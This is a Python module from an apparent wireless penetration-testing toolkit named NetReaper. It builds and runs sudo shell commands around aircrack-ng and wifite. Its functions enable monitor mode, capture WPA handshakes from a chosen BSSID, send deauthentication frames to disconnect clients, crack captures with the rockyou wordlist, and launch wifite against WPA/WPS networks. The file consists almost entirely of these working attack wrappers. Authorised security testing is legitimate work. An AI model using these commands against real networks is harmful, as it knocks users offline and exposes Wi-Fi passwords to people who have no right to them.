"""
NetReaper - Wireless / Wi-Fi module
Author: 09azo14 | License: MIT
"""

import os

from rich.console import Console
from rich.prompt import Prompt
from core.utils import run_command, select_interface, sanitize_for_shell
from core.platform import supported_modules, os_label

console = Console()


def run(action: str, logger) -> None:
    """Execute wireless command."""
    if not supported_modules().get("wireless", False):
        console.print(f"[red] Wireless module is not supported on {os_label()}.[/]")
        return
    iface = select_interface() if action not in ("monitor_off",) else "wlan0"
    if not iface:
        return

    safe_iface = sanitize_for_shell(iface)
    if action == "monitor_on":
        cmd = f"sudo airmon-ng start {safe_iface}"
    elif action == "monitor_off":
        cmd = f"sudo airmon-ng stop {safe_iface}mon"
    elif action == "scan":
        cmd = f"sudo airodump-ng {safe_iface}mon"
    elif action == "capture_hs":
        channel = sanitize_for_shell(Prompt.ask("[cyan]Channel[/]", default="6"))
        bssid = sanitize_for_shell(Prompt.ask("[cyan]BSSID[/]", default="00:11:22:33:44:55"))
        output = sanitize_for_shell(Prompt.ask("[cyan]File prefix[/]", default="/tmp/netreaper_handshake"))
        cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output} {safe_iface}mon"
    elif action == "deauth":
        bssid = sanitize_for_shell(Prompt.ask("[cyan]BSSID[/]", default="00:11:22:33:44:55"))
        cmd = f"sudo aireplay-ng --deauth 5 -a {bssid} {safe_iface}mon"
    elif action == "crack_wpa":
        capture = sanitize_for_shell(Prompt.ask("[cyan].cap file[/]"))
        default_wordlist = "/usr/share/wordlists/rockyou.txt" if os.name != "nt" else "C:\\wordlists\\rockyou.txt"
        wordlist = sanitize_for_shell(Prompt.ask("[cyan]Wordlist[/]", default=default_wordlist))
        cmd = f"aircrack-ng {capture} -w {wordlist}"
    elif action == "wifite":
        cmd = f"sudo wifite --wpa --wps -i {safe_iface} --kill --no-wps"
    else:
        console.print(f"[red] Unknown action: {action}[/]")
        return

    console.print(f"\n[bold cyan]-> Wireless: {action}[/]")
    output = run_command(cmd, logger=logger, module="wireless", target=iface, timeout=120)
    logger.save_report(f"wireless_{action}_{iface}", output)
